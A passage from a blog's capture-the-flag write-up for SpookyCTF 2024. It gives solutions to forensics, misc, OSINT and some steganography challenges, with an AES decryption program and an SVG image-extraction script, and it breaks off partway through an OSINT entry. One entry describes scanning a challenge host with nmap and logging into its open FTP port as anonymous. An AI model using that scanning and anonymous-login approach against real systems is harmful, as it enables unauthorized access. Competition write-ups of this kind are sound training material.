<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta name="robots" content="noodp" />
        <title>SpookyCTF 2024 - Full Writeup - TheSaucese&#39;s Blog</title><meta name="Description" content="$ sudo apt install pwntools"><meta property="og:url" content="https://thesaucese.github.io/spookyctf-2024-full-writeup/">
  <meta property="og:site_name" content="TheSaucese&#39;s Blog">
  <meta property="og:title" content="SpookyCTF 2024 - Full Writeup">
  <meta property="og:description" content="Intro This CTF was fun and I would recommend it for beginners ! On par with DeadFace.
This writeup contains all the challanges that I have solved (14 challenges).
The categories were : Forensics, Osint, Steganography, Misc and Web (Well, technically it’s Reverse).
memory-puzzle - Forensics Description The Consortium has concealed a critical file within a memory dump, protected by layers of digital obfuscation. Led by Simon Letti, participants must sift through the volatile memory landscape to locate a plaintext key that unlocks the encrypted file.">
  <meta property="og:locale" content="en">
  <meta property="og:type" content="article">
    <meta property="article:section" content="posts">
    <meta property="article:published_time" content="2024-10-30T20:00:36+06:00">
    <meta property="article:modified_time" content="2024-10-30T20:00:36+06:00">
    <meta property="article:tag" content="FORENSICS">
    <meta property="article:tag" content="OSINT">
    <meta property="article:tag" content="STEGANO">
    <meta property="article:tag" content="MISC">
    <meta property="article:tag" content="WEB">
    <meta property="article:tag" content="SPOOKYCTF">
    <meta property="og:image" content="https://thesaucese.github.io/logo.png">

  <meta name="twitter:card" content="summary_large_image">
  <meta name="twitter:image" content="https://thesaucese.github.io/logo.png">
  <meta name="twitter:title" content="SpookyCTF 2024 - Full Writeup">
  <meta name="twitter:description" content="Intro This CTF was fun and I would recommend it for beginners ! On par with DeadFace.
This writeup contains all the challanges that I have solved (14 challenges).
The categories were : Forensics, Osint, Steganography, Misc and Web (Well, technically it’s Reverse).
memory-puzzle - Forensics Description The Consortium has concealed a critical file within a memory dump, protected by layers of digital obfuscation. Led by Simon Letti, participants must sift through the volatile memory landscape to locate a plaintext key that unlocks the encrypted file.">
<meta name="application-name" content="Blogs">
<meta name="apple-mobile-web-app-title" content="Blogs"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://thesaucese.github.io/spookyctf-2024-full-writeup/" /><link rel="prev" href="https://thesaucese.github.io/easy-license/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
        <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
        <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
    {
        "@context": "http://schema.org",
        "@type": "BlogPosting",
        "headline": "SpookyCTF 2024 - Full Writeup",
        "inLanguage": "en",
        "mainEntityOfPage": {
            "@type": "WebPage",
            "@id": "https:\/\/thesaucese.github.io\/spookyctf-2024-full-writeup\/"
        },"genre": "posts","keywords": "FORENSICS, OSINT, STEGANO, MISC, WEB, SPOOKYCTF, REVERSE, 2024","wordcount":  2461 ,
        "url": "https:\/\/thesaucese.github.io\/spookyctf-2024-full-writeup\/","datePublished": "2024-10-30T20:00:36+06:00","dateModified": "2024-10-30T20:00:36+06:00","publisher": {
            "@type": "Organization",
            "name": ""},"author": {
                "@type": "Person",
                "name": "theSaucese"
            },"description": ""
    }
    </script></head>
    <body data-header-desktop="auto" data-header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('dark' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'dark' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>

        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
    <div class="header-wrapper">
        <div class="header-title">
            <a href="/" title="TheSaucese&#39;s Blog"><span id="id-1" class="typeit"></span></a>
        </div>
        <div class="menu">
            <div class="menu-inner"><a class="menu-item" href="/posts/"> Posts </a><a class="menu-item" href="/tags/"> Tags </a><a class="menu-item" href="/aboutme/"> About Me </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
                        <input type="text" placeholder="Search titles or contents..." id="search-input-desktop">
                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
                        </a>
                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Clear">
                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
                        </a>
                        <span class="search-button search-loading" id="search-loading-desktop">
                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
                        </span>
                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
                </a></div>
        </div>
    </div>
</header><header class="mobile" id="header-mobile">
    <div class="header-container">
        <div class="header-wrapper">
            <div class="header-title">
                <a href="/" title="TheSaucese&#39;s Blog"><span id="id-2" class="typeit"></span></a>
            </div>
            <div class="menu-toggle" id="menu-toggle-mobile">
                <span></span><span></span><span></span>
            </div>
        </div>
        <div class="menu" id="menu-mobile"><div class="search-wrapper">
                    <div class="search mobile" id="search-mobile">
                        <input type="text" placeholder="Search titles or contents..." id="search-input-mobile">
                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Search">
                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
                        </a>
                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Clear">
                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
                        </a>
                        <span class="search-button search-loading" id="search-loading-mobile">
                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
                        </span>
                    </div>
                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
                        Cancel
                    </a>
                </div><a class="menu-item" href="/posts/" title="">Posts</a><a class="menu-item" href="/tags/" title="">Tags</a><a class="menu-item" href="/aboutme/" title="">About Me</a><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
            </a></div>
    </div>
</header><div class="search-dropdown desktop">
        <div id="search-dropdown-desktop"></div>
    </div>
    <div class="search-dropdown mobile">
        <div id="search-dropdown-mobile"></div>
    </div><main class="main">
                <div class="container"><div class="toc" id="toc-auto">
            <h2 class="toc-title">Contents</h2>
            <div class="toc-content" id="toc-content-auto"></div>
        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">SpookyCTF 2024 - Full Writeup</h1><div class="post-meta">
            <div class="post-meta-line"><span class="post-author"><a href="https://thesaucese.github.io" title="Author" target="_blank" rel="noopener noreffer author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>theSaucese</a></span>&nbsp;<span class="post-category">included in <a href="/categories/writeups/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>Writeups</a></span></div>
            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2024-10-30">2024-10-30</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;2461 words&nbsp;
                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;12 minutes&nbsp;</div>
        </div><div class="details toc" id="toc-static"  data-kept="">
                <div class="details-summary toc-title">
                    <span>Contents</span>
                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
                </div>
                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
  <ul>
    <li><a href="#intro">Intro</a></li>
    <li><a href="#memory-puzzle---forensics">memory-puzzle - Forensics</a>
      <ul>
        <li><a href="#description">Description</a></li>
        <li><a href="#explanation">Explanation</a></li>
      </ul>
    </li>
    <li><a href="#wont-somebody-think-of-the-children---forensics">wont-somebody-think-of-the-children - Forensics</a>
      <ul>
        <li><a href="#description-1">Description</a></li>
        <li><a href="#explanation-1">Explanation</a></li>
      </ul>
    </li>
    <li><a href="#strange-sightings---misc">strange-sightings - Misc</a>
      <ul>
        <li><a href="#description-2">Description</a></li>
        <li><a href="#explanation-2">Explanation</a></li>
      </ul>
    </li>
    <li><a href="#the-true-bloop---misc">the-true-bloop - Misc</a>
      <ul>
        <li><a href="#description-3">Description</a></li>
        <li><a href="#explanation-3">Explanation</a></li>
      </ul>
    </li>
    <li><a href="#two-frames-one-champ---misc">two-frames-one-champ - Misc</a>
      <ul>
        <li><a href="#description-4">Description</a></li>
        <li><a href="#explanation-4">Explanation</a></li>
      </ul>
    </li>
    <li><a href="#among-us---osint">among-us - Osint</a>
      <ul>
        <li><a href="#description-5">Description</a></li>
        <li><a href="#hint">Hint</a></li>
        <li><a href="#explanation-5">Explanation</a></li>
      </ul>
    </li>
    <li><a href="#cryptid-chats---osint">cryptid-chats - Osint</a>
      <ul>
        <li><a href="#description-6">Description</a></li>
        <li><a href="#explanation-6">Explanation</a></li>
      </ul>
    </li>
    <li><a href="#perfect-nba-fit---osint">perfect-nba-fit - Osint</a>
      <ul>
        <li><a href="#description-7">Description</a></li>
        <li><a href="#explanation-7">Explanation</a></li>
      </ul>
    </li>
    <li><a href="#they-have-returned---osint">they-have-returned - Osint</a>
      <ul>
        <li><a href="#description-8">Description</a></li>
      </ul>
    </li>
    <li><a href="#hint-1">Hint</a>
      <ul>
        <li><a href="#explanation-8">Explanation</a></li>
      </ul>
    </li>
    <li><a href="#photo-clue---steganography">photo-clue - Steganography</a>
      <ul>
        <li><a href="#description-9">Description</a></li>
        <li><a href="#explanation-9">Explanation</a></li>
      </ul>
    </li>
    <li><a href="#set-your-intentions-right---steganography">set-your-intentions-right - Steganography</a>
      <ul>
        <li><a href="#description-10">Description</a></li>
        <li><a href="#explanation-10">Explanation</a></li>
      </ul>
    </li>
    <li><a href="#whispers-in-morse---steganography">whispers-in-morse - Steganography</a>
      <ul>
        <li><a href="#description-11">Description</a></li>
        <li><a href="#explanation-11">Explanation</a></li>
      </ul>
    </li>
    <li><a href="#entangled-server---web">entangled-server - Web</a>
      <ul>
        <li><a href="#description-12">Description</a></li>
        <li><a href="#explanation-12">Explanation</a></li>
        <li><a href="#script">Script</a></li>
      </ul>
    </li>
    <li><a href="#future-plans---web">Future Plans - Web</a>
      <ul>
        <li><a href="#description-13">Description</a></li>
        <li><a href="#hint1">Hint#1</a></li>
        <li><a href="#hint2">Hint#2</a></li>
        <li><a href="#explanation-13">Explanation</a></li>
      </ul>
    </li>
  </ul>
</nav></div>
            </div><div class="content" id="content"><h2 id="intro">Intro</h2>
<p>This CTF was fun and I would recommend it for beginners ! On par with DeadFace.</p>
<p>This writeup contains all the challanges that I have solved (14 challenges).</p>
<p>The categories were : Forensics, Osint, Steganography, Misc and Web (Well, technically it&rsquo;s Reverse).</p>
<h2 id="memory-puzzle---forensics">memory-puzzle - Forensics</h2>
<h3 id="description">Description</h3>
<p>The Consortium has concealed a critical file within a memory dump, protected by layers of digital obfuscation. Led by Simon Letti, participants must sift through the volatile memory landscape to locate a plaintext key that unlocks the encrypted file. Time is of the essence, as Roko&rsquo;s Basilisk threatens to distort the data with each passing moment. Can you unravel the puzzle before the Basilisk intervenes?</p>
<p>&ldquo;Basilisk&rsquo;s whisper will not wait&rdquo; echos through your mind as you enter the file.</p>
<p>(Note: If you choose to use volatility2.6, use profile Win10x64_19041)</p>
<h3 id="explanation">Explanation</h3>
<p>Keep digging with Volatility&hellip;</p>
<p>You&rsquo;ll have to manually keep looking till you find flag.enc and system-update.exe.</p>
<p>reverse engineer system-update.exe you&rsquo;ll find the flag was AES encrypted and the key was <code>SuperSecretKey12</code></p>
<p>So I wrote a decryption script :</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;openssl/evp.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">FILE</span> <span class="o">*</span><span class="n">enc_file</span> <span class="o">=</span> <span class="nf">fopen</span><span class="p">(</span><span class="s">&#34;flag.enc&#34;</span><span class="p">,</span> <span class="s">&#34;rb&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">FILE</span> <span class="o">*</span><span class="n">dec_file</span> <span class="o">=</span> <span class="nf">fopen</span><span class="p">(</span><span class="s">&#34;flag_decrypted.txt&#34;</span><span class="p">,</span> <span class="s">&#34;wb&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">enc_file</span> <span class="o">||</span> <span class="o">!</span><span class="n">dec_file</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nf">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&#34;Error opening files.</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">key</span> <span class="o">=</span> <span class="s">&#34;SuperSecretKey12&#34;</span><span class="p">;</span> <span class="c1">// Same key used in encryption
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">iv</span><span class="p">[</span><span class="mi">16</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="mi">0</span><span class="p">};</span> <span class="c1">// All zero IV as in encryption
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">enc_buf</span><span class="p">[</span><span class="mi">1024</span><span class="p">],</span> <span class="n">dec_buf</span><span class="p">[</span><span class="mi">1024</span> <span class="o">+</span> <span class="n">EVP_MAX_BLOCK_LENGTH</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">len</span><span class="p">,</span> <span class="n">dec_len</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">EVP_CIPHER_CTX</span> <span class="o">*</span><span class="n">ctx</span> <span class="o">=</span> <span class="nf">EVP_CIPHER_CTX_new</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">ctx</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nf">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&#34;Failed to create EVP_CIPHER_CTX</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nf">EVP_DecryptInit_ex</span><span class="p">(</span><span class="n">ctx</span><span class="p">,</span> <span class="nf">EVP_aes_128_cbc</span><span class="p">(),</span> <span class="nb">NULL</span><span class="p">,</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">key</span><span class="p">,</span> <span class="n">iv</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nf">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&#34;Failed to initialize decryption</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nf">EVP_CIPHER_CTX_free</span><span class="p">(</span><span class="n">ctx</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">while</span> <span class="p">((</span><span class="n">len</span> <span class="o">=</span> <span class="nf">fread</span><span class="p">(</span><span class="n">enc_buf</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">enc_buf</span><span class="p">),</span> <span class="n">enc_file</span><span class="p">))</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nf">EVP_DecryptUpdate</span><span class="p">(</span><span class="n">ctx</span><span class="p">,</span> <span class="n">dec_buf</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">dec_len</span><span class="p">,</span> <span class="n">enc_buf</span><span class="p">,</span> <span class="n">len</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nf">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&#34;Decryption update failed</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="nf">EVP_CIPHER_CTX_free</span><span class="p">(</span><span class="n">ctx</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="nf">fwrite</span><span class="p">(</span><span class="n">dec_buf</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="n">dec_len</span><span class="p">,</span> <span class="n">dec_file</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nf">EVP_DecryptFinal_ex</span><span class="p">(</span><span class="n">ctx</span><span class="p">,</span> <span class="n">dec_buf</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">dec_len</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nf">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&#34;Final decryption step failed</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nf">EVP_CIPHER_CTX_free</span><span class="p">(</span><span class="n">ctx</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="nf">fwrite</span><span class="p">(</span><span class="n">dec_buf</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="n">dec_len</span><span class="p">,</span> <span class="n">dec_file</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nf">EVP_CIPHER_CTX_free</span><span class="p">(</span><span class="n">ctx</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">fclose</span><span class="p">(</span><span class="n">enc_file</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">fclose</span><span class="p">(</span><span class="n">dec_file</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Decryption complete. Output saved to flag_decrypted.txt</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><hr>
<h2 id="wont-somebody-think-of-the-children---forensics">wont-somebody-think-of-the-children - Forensics</h2>
<h3 id="description-1">Description</h3>
<p>If Loab is back, we might need the council to help us out. The problem is that Anna sent Maya looking for them but she still hasn&rsquo;t come back. This is her last known location&hellip; Maybe you can help find her.</p>
<p>I&rsquo;d go, but I really don&rsquo;t want to be around those spooky ghost orphans.</p>
<h3 id="explanation-1">Explanation</h3>
<p>SVGs are like onions. Onions have layers, SVGs have layers. Get it ?</p>
<p>If you open up an SVG file you&rsquo;ll find that it has a bunch of base64 encoded images. So I wrote a script to extract all the images :</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">re</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">base64</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">os</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">## Read SVG file</span>
</span></span><span class="line"><span class="cl"><span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&#34;orphans2.svg&#34;</span><span class="p">,</span> <span class="s2">&#34;r&#34;</span><span class="p">)</span> <span class="k">as</span> <span class="n">file</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">svg_content</span> <span class="o">=</span> <span class="n">file</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">## Find all base64 image data using regex</span>
</span></span><span class="line"><span class="cl"><span class="n">image_data</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">findall</span><span class="p">(</span><span class="sa">r</span><span class="s1">&#39;href=&#34;data:image/png;base64,([^&#34;]+)&#34;&#39;</span><span class="p">,</span> <span class="n">svg_content</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">## Create a folder to save extracted images</span>
</span></span><span class="line"><span class="cl"><span class="n">output_folder</span> <span class="o">=</span> <span class="s2">&#34;extracted_images&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">os</span><span class="o">.</span><span class="n">makedirs</span><span class="p">(</span><span class="n">output_folder</span><span class="p">,</span> <span class="n">exist_ok</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">## Decode and save each image</span>
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span><span class="p">,</span> <span class="n">data</span> <span class="ow">in</span> <span class="nb">enumerate</span><span class="p">(</span><span class="n">image_data</span><span class="p">,</span> <span class="mi">1</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">img_data</span> <span class="o">=</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64decode</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">img_path</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">output_folder</span><span class="p">,</span> <span class="sa">f</span><span class="s2">&#34;image_</span><span class="si">{</span><span class="n">i</span><span class="si">}</span><span class="s2">.png&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">img_path</span><span class="p">,</span> <span class="s2">&#34;wb&#34;</span><span class="p">)</span> <span class="k">as</span> <span class="n">img_file</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">img_file</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">img_data</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;Extracted </span><span class="si">{</span><span class="nb">len</span><span class="p">(</span><span class="n">image_data</span><span class="p">)</span><span class="si">}</span><span class="s2"> images to &#39;</span><span class="si">{</span><span class="n">output_folder</span><span class="si">}</span><span class="s2">&#39;&#34;</span><span class="p">)</span>
</span></span></code></pre></div><hr>
<h2 id="strange-sightings---misc">strange-sightings - Misc</h2>
<h3 id="description-2">Description</h3>
<p>NICC agents were sent this video by an anonymous source. What does it mean?!</p>
<p>Warning: The video is very spooky.</p>
<h3 id="explanation-2">Explanation</h3>
<p>The video was indeed spooky, there was a lot of fake signs which wasted me a lot of time but in the end I figured out that the light switching on and off clip had to be a morse code.</p>
<p>Using pen and paper I wrote down the morse code which ended up being an address, I scanned it with nmap and found that the FTP port was open, connected to it, got an error that mentioned anonymity so I logged in as anonymous and there it was, the flag !</p>
<hr>
<h2 id="the-true-bloop---misc">the-true-bloop - Misc</h2>
<h3 id="description-3">Description</h3>
<p>In 1997, an underwater anomaly was recorded by the NOAA (National Ocean and Atmospheric Administration). No explanation for the sound could be given at the time, but eventually a widely accepted answer elaborating on glacial movements surfaced. At least, that&rsquo;s what we thought. Recently, in her exploits across time, Mary Morse of NICC has ended up in 1997 to uncover the &ldquo;truth&rdquo; as she playfully calls it. Her whereabouts are currently unknown (as always), but a series of tones were presumably sent by her deep beneath the sea. They were recorded, augmented, and kept for years by NOAA staff in addition to the titular bloop. Perhaps she discovered something so foreboding it had to be hidden? We were able to crack the first part - g4ed_j05_dX_b0Ww0q_0f_wu4rcK. Looks to be a Vigenere cipher encoded with a key. Your job is to find the key to go with this cipher and break it.</p>
<p>(After cracking the Vigenere cipher, place it between the curly braces in NICC{}!).</p>
<h3 id="explanation-3">Explanation</h3>
<p>We have 4 wav files, and I play the guitar (flex), so I figured out the notes easily (coughcough perfect pitch), the key was &ldquo;DEAD&rdquo; or Dsus2 (another flex). Use the vigenere cipher to decode the flag.</p>
<hr>
<h2 id="two-frames-one-champ---misc">two-frames-one-champ - Misc</h2>
<h3 id="description-4">Description</h3>
<p>Lake Champlain has always been a hotspot for mysterious sightings, but it seems like something recently odd came up. Apparently an old cryptid hunter went missing after attempting to reveal his findings. Rumors have been spreading that the cryptid hunter was once affiliated with the Consortium. But anything they left behind? An broken hard drive. Simon was able to recover the hard drive. Unfortunately, he was only able to recover two images files that are corrupted, likely tampered by the Consortium. Anna is tasking you to JOIN Simon piece this puzzle TOGETHER to uncover what the Consortium are hiding.</p>
<h3 id="explanation-4">Explanation</h3>
<p>Both images are corrupted, thankfully only the header is corrupted, we know they&rsquo;re PNGs so we know what the actual header is.</p>
<p>Then use stegsolve to xor both images :
<img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="%7b67F62E29-CE08-43CE-B450-A88B6B7F275B%7d.png"
        data-srcset="%7b67F62E29-CE08-43CE-B450-A88B6B7F275B%7d.png, %7b67F62E29-CE08-43CE-B450-A88B6B7F275B%7d.png 1.5x, %7b67F62E29-CE08-43CE-B450-A88B6B7F275B%7d.png 2x"
        data-sizes="auto"
        alt="{67F62E29-CE08-43CE-B450-A88B6B7F275B}.png"
        title="alt text" /></p>
<hr>
<h2 id="among-us---osint">among-us - Osint</h2>
<h3 id="description-5">Description</h3>
<p>The Jersey Devil is opening up a secondary shop in his hometown of the New Jersey Pine Barrens, with the other in dystopian New York City. With the opening of the shop in New Jersey, he would need to spend more time here. A video game is said to have the name of the shop the Jersey Devil owns. Find the name of the game and the name of the shop:</p>
<p>Example: NICC{Name_of_Video_Game_Name_of_Shop}</p>
<h3 id="hint">Hint</h3>
<p>The sequeal to this game is set to release this year.</p>
<h3 id="explanation-5">Explanation</h3>
<p>The title itself is a hint, nope not the hit game among us, it&rsquo;s actually the wolf among us.</p>
<p>At first I thought the place was real, but there&rsquo;s nothing in Pine Barrens, so I googled Among us Jersey Devil and found this <a href="https://fables.fandom.com/wiki/Jersey_Devil" target="_blank" rel="noopener noreffer ">wiki page</a> where it states that the Jersey Devil owned a shop in Fabletown NYC called Lucky Pawn !</p>
<hr>
<h2 id="cryptid-chats---osint">cryptid-chats - Osint</h2>
<h3 id="description-6">Description</h3>
<p>We know the Dr. Tom is currently on the lookout for another cryptid. We think he might have made a mistake and is instead following someone in a costume. We got a tip that Dr. Tom was harassing a famous actor who happened to be in costume for their upcoming movie and was simply visiting a business because they had posted about him recently on their social media. We hacked into Dr. Tom&rsquo;s phone and got a picture from where he started and the path he took. It must&rsquo;ve been pretty realistic - do you know what the character is called?</p>
<h3 id="explanation-6">Explanation</h3>
<p>You&rsquo;ll have to simply follow the path Dr. Tom took, Some places don&rsquo;t have streetmaps like the bike path so you&rsquo;ll have to switch views.</p>
<p>As you head to the drug store the brick sign is NOT the stone sign, you&rsquo;ll have to keep going until you find this place:
<img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="%7b9ADA5CD5-4798-4421-81BD-EB1075AFD504%7d.png"
